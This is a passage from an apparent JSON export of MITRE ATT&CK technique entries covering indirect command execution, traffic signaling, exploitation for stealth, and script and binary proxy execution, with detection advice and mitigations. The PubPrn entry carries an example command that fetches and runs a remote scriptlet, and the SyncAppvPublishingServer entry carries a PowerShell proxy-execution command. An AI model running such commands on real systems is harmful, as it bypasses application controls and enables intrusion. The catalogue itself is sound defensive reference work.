href=\"https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Hunting for Persistence Part 1)</a> Also consider investigating more detailed information about jobs by parsing the BITS job database. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Network Traffic: Network Connection Creation","Process: Process Creation","Service: Service Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider limiting access to the BITS interface to specific users or groups. <a href=\"https://www.symantec.com/connect/blogs/malware-update-windows-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec BITS May 2007)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Consider reducing the default BITS job lifetime in Group Policy or by editing the <code>JobInactivityTimeout</code> and <code>MaxDownloadTime</code> Registry values in <code> HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS</code>. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic."}],"subTechniques":[]},{"id":"T1202","name":"Indirect Command Execution","description":"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (<code>pcalua.exe</code>), components of the Windows Subsystem for Linux (WSL), <code>Scriptrunner.exe</code>, as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts. <a href=\"https://x.com/vector_sec/status/896049052642533376\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VectorSec ForFiles Aug 2017)</a> <a href=\"https://x.com/Evi1cg/status/935027922397573120\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Evi1cg Forfiles Nov 2017)</a> <a href=\"https://secureteam.co.uk/2023/01/08/windows-error-reporting-tool-abused-to-load-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Team - Scriptrunner.exe)</a> <a href=\"https://ss64.com/nt/scriptrunner.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SS64)</a> <a href=\"https://www.bleepingcomputer.com/news/security/hackers-abuse-windows-error-reporting-tool-to-deploy-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer - Scriptrunner.exe)</a> Adversaries may also abuse the <code>ssh.exe</code> binary to execute malicious commands via the <code>ProxyCommand</code> and <code>LocalCommand</code> options, which can be invoked via the <code>-o</code> flag or by modifying the SSH config file. <a href=\"https://cyble.com/blog/threat-actor-targets-manufacturing-industry-with-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)</a>\n\nAdversaries may abuse these features for Stealth, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.","detection":"Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. <a href=\"https://community.rsa.com/community/products/netwitness/blog/2017/08/14/are-you-looking-out-for-forfilesexe-if-you-are-watching-for-cmdexe\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RSA Forfiles Aug 2017)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[],"subTechniques":[]},{"id":"T1205","name":"Traffic Signaling","description":"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <a href=\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hartrell cd00r 2002)</a>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a> <a href=\"https://www.mandiant.com/resources/synful-knock-acis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant - Synful Knock)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement. <a href=\"https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer - Ryuk WoL)</a> <a href=\"https://www.amd.com/system/files/TechDocs/20213.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AMD Magic Packet)</a>","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt. <a href=\"https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitLab WakeOnLAN)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Process: Process Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Wake-on-LAN if it is not needed within an environment."}],"subTechniques":[{"id":"T1205.001","name":"Port Knocking","description":"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <a href=\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hartrell cd00r 2002)</a>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."}]},{"id":"T1205.002","name":"Socket Filters","description":"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the <code>libpcap</code> library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. <a href=\"http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: haking9 libpcap network sniffing)</a> Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling. <a href=\"https://exatrack.com/public/Tricephalic_Hellkeeper.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: exatrack bpf filters passive backdoors)</a> <a href=\"https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Leonardo Turla Penquin May 2020)</a>\n\nFilters can be installed on any Unix-like platform with <code>libpcap</code> installed or on Windows hosts using <code>Winpcap</code>.  Adversaries may use either <code>libpcap</code> with <code>pcap_setfilter</code> or the standard library function <code>setsockopt</code> with <code>SO_ATTACH_FILTER</code> options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","detection":"Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy. <a href=\"https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: crowdstrike bpf socket filters)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."}]}]},{"id":"T1211","name":"Exploitation for Stealth","description":"Adversaries may exploit vulnerabilities to evade detection by hiding activity, suppressing logging, or operating within trusted or unmonitored components. \n\nAdversaries may exploit a system or application vulnerability to avoid detection while maintaining access within an environment. Exploitation occurs when an adversary leverages a programming flaw to execute code in a manner that minimizes visibility or blends in with legitimate activity. \n\nRather than directly disabling defenses, adversaries may use exploitation to circumvent monitoring and logging mechanisms. This can include abusing vulnerabilities in logging pipelines, security tools, or cloud infrastructure to evade audit trails, suppress alerts, or operate without generating telemetry. \n\nAdversaries may identify these opportunities through prior reconnaissance or by performing discovery of security controls after initial access. In some cases, vulnerabilities in SaaS or public cloud environments may be exploited to evade logging, obscure activity, or deploy infrastructure that remains hidden from standard monitoring tools. <a href=\"https://securitylabs.datadoghq.com/articles/bypass-cloudtrail-aws-service-catalog-and-other/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bypassing CloudTrail in AWS Service Catalog)</a> <a href=\"https://www.bleepingcomputer.com/news/security/ghosttoken-gcp-flaw-let-attackers-backdoor-google-accounts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GhostToken GCP flaw)</a>","detection":"Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery.","platforms":["Linux","Windows","macOS","SaaS","IaaS"],"dataSources":["Application Log: Application Log Content","Process: Process Creation"],"mitigations":[{"id":"M1019","name":"Threat Intelligence Program","description":"Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. <a href=\"https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Moving Beyond EMET)</a> Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. <a href=\"https://en.wikipedia.org/wiki/Control-flow_integrity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Control Flow Integrity)</a> Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion."},{"id":"M1051","name":"Update Software","description":"Update software regularly by employing patch management for internal enterprise endpoints and servers."}],"subTechniques":[]},{"id":"T1216","name":"System Script Proxy Execution","description":"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. <a href=\"https://github.com/LOLBAS-Project/LOLBAS#criteria\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Project)</a> This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems. <a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Ultimate AppLocker Bypass List)</a>","detection":"Monitor script processes, such as <code>cscript</code>, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Script: Script Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."}],"subTechniques":[{"id":"T1216.001","name":"PubPrn","description":"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>. <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: pubprn)</a>\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. <a href=\"https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma0x3 PubPrn Bypass)</a> To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).","detection":"Monitor script processes, such as <code>cscript</code>, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Script: Script Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft_rec_block_rules)</a>"}]},{"id":"T1216.002","name":"SyncAppvPublishingServer","description":"Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). <a href=\"https://securelist.com/bluenoroff-methods-bypass-motw/108383/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 1 - appv)</a> For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally. <a href=\"https://learn.microsoft.com/en-us/windows/application-management/app-v/appv-getting-started\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 2 - appv)</a> <a href=\"https://www.hackingarticles.in/indirect-command-execution-defense-evasion-t1202/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 3 - appv)</a>\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from <code>\\System32</code> through the command line via <code>wscript.exe</code>. <a href=\"https://www.trellix.com/en-ca/about/newsroom/stories/research/suspected-darkhotel-apt-activity-update/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 4 - appv)</a> <a href=\"https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 5 - appv)</a>\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" <a href=\"https://strontic.github.io/xcyclopedia/library/SyncAppvPublishingServer.exe-3C291419F60CDF9C2E4E19AD89944FA3.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 6 - appv)</a> <a href=\"https://www.trellix.com/en-ca/about/newsroom/stories/research/suspected-darkhotel-apt-activity-update/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 4 - appv)</a> Proxying execution may function as a trusted/signed alternative to directly invoking <code>powershell.exe</code>. <a href=\"https://x.com/monoxgas/status/895045566090010624\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 7 - appv)</a>\n\nFor example,  PowerShell commands may be invoked using: <a href=\"https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 5 - appv)</a>\n\n<code>SyncAppvPublishingServer.vbs \"n; {PowerShell}\"</code>","detection":"","platforms":["Windows"],"dataSources":["Script: Script Execution","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."}]}]},{"id":"T1218","name":"System Binary Proxy Execution","description":"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. <a href=\"https://github.com/LOLBAS-Project/LOLBAS#criteria\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Project)</a> Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands. <a href=\"https://man7.org/linux/man-pages/man1/split.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: split man page)</a> <a href=\"https://gtfobins.github.io/gtfobins/split/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFO split)</a>","detection":"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Windows Registry: Windows Registry Key Modification","Module: Module Load","File: File Creation","Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."},{"id":"M1026","name":"Privileged Account Management","description":"Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage."},{"id":"M1037","name":"Filter Network Traffic","description":"Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic."},{"id":"M1038","name":"Execution Prevention","description":"Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Many native binaries may not be necessary within a given environment."},{"id":"M1050","name":"Exploit Protection","description":"Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using using trusted binaries to bypass application control."}],"subTechniques":[{"id":"T1218.001","name":"Compiled HTML File","description":"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. <a href=\"https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft HTML Help May 2018)</a> CHM content is displayed using underlying components of the Internet Explorer browser <a href=\"https://msdn.microsoft.com/windows/desktop/ms644670\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft HTML Help ActiveX)</a> loaded by the HTML Help executable program (hh.exe). <a href=\"https://msdn.microsoft.com/windows/desktop/ms524405\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft HTML Help Executable Program)</a>\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. <a href=\"https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MsitPros CHM Aug 2017)</a> <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CVE-2017-8625 Aug 2017)</a>","detection":"Monitor and analyze the execution and arguments of hh.exe. <a href=\"https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MsitPros CHM Aug 2017)</a> Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\n\nMonitor presence and use of CHM files, especially if they are not typically used within an environment.","platforms":["Windows"],"dataSources":["File: File Creation","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns, such as CHM files"},{"id":"M1038","name":"Execution Prevention","description":"Consider using application control to prevent execution of hh.exe if it is not required for a given system or network to prevent potential misuse by adversaries."}]},{"id":"T1218.002","name":"Control Panel","description":"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. <a href=\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Implementing CPL)</a> <a href=\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Jan 2014)</a> For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. <a href=\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Implementing CPL)</a> Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. <a href=\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Implementing CPL)</a> <a href=\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Jan 2014)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Dec 2013)</a>\n\nMalicious Control Panel items can be delivered via Phishing campaigns <a href=\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Jan 2014)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Dec 2013)</a> or executed as part of multi-stage malware. <a href=\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Reaver Nov 2017)</a> Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET InvisiMole June 2020)</a>","detection":"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL</code> and <code>ControlRunDLLAsUser</code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before Rundll32 is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter Rundll32 command, which may bypass detections and/or execution filters for control.exe. <a href=\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Jan 2014)</a>\n\nInventory Control Panel items to locate unregistered and potentially malicious files present on systems:\n\n* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace</code> and <code>HKEY_CLASSES_ROOT\\CLSID\\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. <a href=\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Implementing CPL)</a>\n* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>CPLs</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(\"c:\\windows\\system32\\control.exe {Canonical_Name}\", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>). <a href=\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Implementing CPL)</a>\n* Some Control Panel items 